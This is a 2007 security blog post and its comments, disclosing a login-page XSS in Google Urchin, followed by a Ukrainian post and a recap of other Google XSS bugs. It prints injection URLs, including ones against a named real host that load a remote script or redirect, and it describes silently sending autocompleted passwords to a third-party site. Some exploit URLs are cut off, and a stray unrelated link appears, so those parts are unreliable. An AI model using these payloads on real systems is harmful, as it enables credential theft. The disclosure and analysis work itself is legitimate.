# Google Urchin Password Theft Madness

Mon, 24 Sep 2007 14:14:49 GMTby
pagvac

There is a trivially exploitable XSS vul on [Google Urchin Web Analytics 5](https://www.google.com/search?q=intext%3A%22Urchin+Web+Analytics+v5%22)'s login page. The vulnerability has been tested on versions `5.6.00r2`, `5.7.01`, `5.7.02` and `5.7.03` (latest). Previous versions are most likely to be affected as well. In case you didn't know, [Google Urchin](https://www.google.com/analytics/urchin_downloads.html) is the **install** version of Google Analytics.

I reported the issue to Google back on Jul 25 and was confirmed by their security team. They are now working on a fix. My original plan was to publish this info after a fix would be released. However, the issue [has also been found](http://ha.ckers.org/blog/20070823/xss-and-possible-information-disclosure-in-urchin/) by other folks about a month ago. As usual, the researcher loses credit when following the responsible disclosure route. Here is the boring POC:

```
http://target/session.cgi?"><script>alert('XSS')</script><!--
```

You might have heard before that a XSS vulnerability on a login page is nasty. However most people think that the worst thing you can do is inject a form in order to perform a phishing attack. Although it's true this is a good [example](https://chatbotkit.com/examples) of what you can do, we can also do more advanced XSS phishing attacks that are even harder to detect. My two favorite tricks when finding a XSS vul on a login page are:

* **Overwriting** the login form's `action` attribute so that the victim's username and password are stolen when clicking on Login
* **Stealing** autocomplete data so that victim username and password are stolen *by simply clicking on our exploit URL* (juicy!)

  Anyway, let's get to the point. I know that you're sick of XSS PoCs that only open alert boxes. So here is a exploit URL that will steal the victim's username and password by simply clicking on it. The only requirement is that the victim is using the "autocomplete passwords" feature, aka "Remember passwords for sites":

  <http://target/session.cgi?">><!--

  Using `location` is great for redirecting information to third-party sites. The problem is that the current window will change to show the evil site. Although this is great for demo purposes, it sucks when it comes to being stealth, since the victim can actually see his/her credentials being sent to another website on the address bar. Instead, we can dynamically create an image with JavaScript so *the credentials are stolen in the background:*

  <http://target/session.cgi?">><!--

The following video shows the previous exploit in action. I don't think the quality of the video is that good, but oh well. Basically what it shows is how after visiting the exploit URL, the username and password are sent to google.com in the background. I use Paros in the video to demonstrate that the credentials do indeed get sent to google.com.

If you look at the code, you'll notice that we wait 1.5 secs using the *setTimeout()* function before forwarding the credentials to the evil site. The reason for this is because we need to let the browser auto-complete the fields before performing the redirect. Otherwise the value of the username and password field would be blank by the time we steal them.

*The PoC has been tested on the latest version of FF (2.0.0.7 at time of writing) and does \_not* work on IE 7, but *might* work on IE 6. This doesn't mean you cannot do a auto-complete password theft attack on IE 7, it just needs a bit of more work! If you want to know the reason behind this difference is that IE 7 requires the user to first type or choose the username from the auto-complete drop-down menu, *before\_ the password field is automatically filled.*

As I wrote at my site month ago (http://websecurity.com.ua/1283/) about this XSS hole in Urchin, RSnake already wrote about this hole. Like you also mentioned about. But as I and RSnake wrote, there is not only XSS, but also Authorization bypass vulnerability in Urchin. Which give possibility to look at statistic without any login and password!
> I know that youâ€™re sick of XSS PoCs that only open alert boxes.

I'm not, I like alert boxes :-), especially alert(document.cookie).
Nevertheless, man, nice XSS PoCs and video ;-).![djteller](//gravatar.com/avatar/44c5e290ccf283471210752d0b1ed6df?s=256&d=retro)djtellerNice work man.
Sorry about the credit issue, but dont worry, you got our respect.![Adrian Pastor](//gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=256&d=retro)Adrian PastorHi MustLive:
Copied and pasted from this very same post:
> I reported the issue to Google back on Jul 25 and was confirmed by their security team. They are now working on a fix. My original plan was to publish this info after a fix would be released. However, the issue has also been found by other folks about a month ago.

In other words, I do mention that it's been publicly made a month ago by others, but ALSO that I reported it to Google 2 months ago and that I was waiting for them to fix it BEFORE making it public.![MustLive](//gravatar.com/avatar/997a9fa55e557e2aa8262a07758b161d?s=256&d=retro)MustLiveHi Adrian!
No need to paste your words, I read your whole post carefully ;-). I understand that you was first who found this hole and I believe you (and Google also know that you was first who tell them about this XSS). Some people who found this hole after you outstrip you with disclosure, but you was the first discoverer, so you have respect of me and security community.
I understand you with this situation, when other guys officially disclosed your hole before you. This incidents sometimes happens in webappsec world. I regularly have such experience, when people disclosing holes which I first discover before me, or when people disclosing holes many months after my disclosure.
What I wrote in my previous comment (and what I wrote at my site), that there is another hole in Urchin. It is Authorization bypass vulnerability (which as I know was found by RSnake and you didn't mention it in your post). This one gives possibility to enter into account without any login and password. It is also interesting hole as your XSS.![Adrian Pastor](//gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=256&d=retro)Adrian PastorHey MustLive,
Thanks for your kind words, very much appreciated!
I did read about the unauthenticated access issue and left my comments here: http://ha.ckers.org/blog/20070823/xss-and-possible-information-disclosure-in-urchin/
> Back in July, when I was searching some examples in Google also noticed that some sites have the Urchin stats wide open, but I thought this was a configuration problem as opposed to a bug.
>
> Are you guys sure there is a authorization bypass hole?

MustLive, is this a 100% verified issue? Have you guys replicated this in a lab environment? I can't make it work on my test installation.

## [Уразливості в Urchin](http://websecurity.com.ua/1283/ "Permanent Link: Уразливості в Urchin")

23:49 26.08.2007

Три дні тому, 23.08.2007, RSnake знайшов Cross-Site Scripting та Authorization bypass уразливості в Urchin - системі аналізу відвідуванності сайта (котру в 2006 році придбав Гугл). Про що він повідомив в записі [XSS and Possible Information Disclosure in Urchin](http://ha.ckers.org/blog/20070823/xss-and-possible-information-disclosure-in-urchin/).

XSS:

* [alert(document.cookie)](http://webstats.enzymedigital.com:10000/?%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E)
* [remote text](http://webstats.enzymedigital.com:10000/?%22%3E%3Cscript%20src%3Dhttp://websecurity.com.ua/webtools/xss.js%3E%3C/script%3E)
* [цікавий](http://webstats.enzymedigital.com:10000/?%22%3E%3Cscript%3Edocument.location%3D'http://websecurity.com.ua'%3C/script%3E)

Authorization bypass:

* [витік інформації](http://webstats.enzymedigital.com:10000/report.cgi?profile=ed-trunktorg&rid=42&prefs=ed-trunktorg&n=10&vid=1301&bd=20070703&ed=20070703&dt=4&gtype=5)

Гуглу та його підрозділу Urchin потрібно буде виправити дані уразливості.

# GoogHOle (XSS pwning GMail, Picasa and almost 200K customers)

Not a great month for Google security.

In the past 3 days, ~~3~~**4** interesting disclosures have been published:

1. [Google Search Appliance XSS](https://hackademix.net/2007/09/21/outsourcing-xss-vulnerabilities/) discovered by [MustLive](http://websecurity.com.ua/1368/), affecting almost 200,000 paying customers of the outsourced search engine and their users: this [Google dork](http://www.google.com/search?q=inurl%3Axml_no_dtd&gl=us) shown 196,000 results at the time of disclosure, now dropped to 188,000. Fear effect?
2. Billy Rios and Nate McFeters revealed the gory details of their already announced [Picasa exploit](http://xs-sniper.com/blog/2007/09/24/stealing-pictures-with-picasa/), leveraging a clever combo of XSS, Cross Application Request Forgery, Flash same domain policy elusion and URI handler weakness exploitation to **steal your private pictures**, straight from your local hard disk, just visiting a malicious web page.
3. Finally, the most simple yet impressive, because of the huge number of users involved: [beford](http://beford.org) decided to launch his new blog disclosing a [Google Polls XSS](http://blog.beford.org/?p=3) which, thanks to the (too) smart “widget reuse” allowing Google services to integrate the same functionality across multiple services, can be used to attack Search, Blogspot, Groups and, the most dramatic exploitation scenario, **GMail**:
   * [This POC steals your Google contacts](http://beford.org/stuff/contacts.htm)
   * [This POC steals your GMail incoming messages](http://beford.org/stuff/gmail.htm), routing them to beford’s mail address — not a GMail account, obviously… :P

   For such an attack to be successful, the victim just needs to visit a malicious website while logged in Google, e.g. by following a link from an incoming message (unless she’s got [anti-XSS protection](http://noscript.net/features#xss)).
4. **update** — a few hours after I released the first version of article, I heard of another Google-outsourced vulnerability, an [Urchin Login XSS](http://www.gnucitizen.org/blog/google-urchin-password-theft-madness) disclosed by GNUCITIZEN’s Adrian Pastor, which could compromise local Google Analytics installations. Its severity may vary depending on how Urchin is installed (e.g. on a domain different than your main site), but the provided proof of concept is quite interesting because it shows an actual credential theft in action, rather than the usual, boring `alert('XSS')`. Not that a more spectacular example proves anything new about the dangers of XSS, but some people just don’t believe until they can see with their own eyes.

These vulnerabilities are surely being fixed at top speed, since Google is one of the most reactive organizations in this fight, but they’re nonetheless disturbing because they hit the very main player on the field, with the largest user base on the web: this make this kind of incidents unavoidable *ipso facto*.

How many vulnerabilities like those just go undisclosed and unpatched, but yet exploited by unethical ~~ha~~**cra**ckers?

Talking about [XSS](http://noscript.net/faq#xss), if you’re an end user and you don’t like to stay at the very bottom of the insecurity food chain, you’d better use [Firefox with NoScript](http://noscript.net) — but that’s your choice, of course. ;)

   Whoosh! Very slick. I clicked on a link and waited before realizing that the code had already executed, entirely transparently. Time to reconfigure NoScript again…

    Giorgio,

    Great recap and thanks for the postback, but I’m afraid you forgot a few… if you take a peak at our site (Billy Rios and I), you’ll see that there’s actually been two other exploits against Google this month. One, <http://xs-sniper.com/blog/2007/09/18/the-old-dog-and-his-old-tricks-part-i/> discusses the use of a Google SMTP server to send arbitrary messages to anyone from Google/GMail.com from anyone from Google/GMail.com. The second, <http://xs-sniper.com/blog/2007/09/20/bk-for-mayor-of-oak-tree-view/> is even scarier (if you plan on using Google Docs) as Billy discovered a way to read the contents of arbitrary documents AND EDIT the contents of arbitrary documents.

    All this, and I can guarantee that there will be more from the two of us this month as I know Billy has a couple more he’s just waiting to talk to Google about.

    Nate,

    I’m a regular reader of your blog and I’ve seen both those posts.

    The mail sending issue is not Google-specific, as it applies to almost any SMTP server: it’s just the way unsigned email works.

    The Google Docs one… well, I must confess I just forgot it: that’s not easy keeping the count now ;)

    Eagerly waiting for the upcoming news…

    Cheers to both you and Billy :)

    Haha, agreed, it isn’t Google specific, anyone could make that mistake, but I do agree that it’s been a rough month for them. Just wait for, oh, say Tuesday… I think Billy will scare some people with his next two posts.

    I feel kind of dirty… I will contact Google first, I guess. Do you want to try it?

    **pdp**, I assumed you already contacted Google, you nasty boy.

    Yes, please do the right thing contacting Google first and yes, I’d like to have a sneak peak in the meanwhile :)

    @**karthi**:

    those links are not dead, it’s just the vulnerability which has been fixed.

    If you want to check how it used to work, you can just look at the source code:

    view-source:<http://beford.org/stuff/contacts.htm>

    view-source:<http://beford.org/stuff/gmail.htm>

    @**karthi**:

    No, nothing bad happens anymore because the bug has been fixed by Google.

    But yes, that was how it used to work originally.

    @**karthi**:

    yes, they can, provided that the site is vulnerable to [XSS](http://noscript.net/faq#xss).
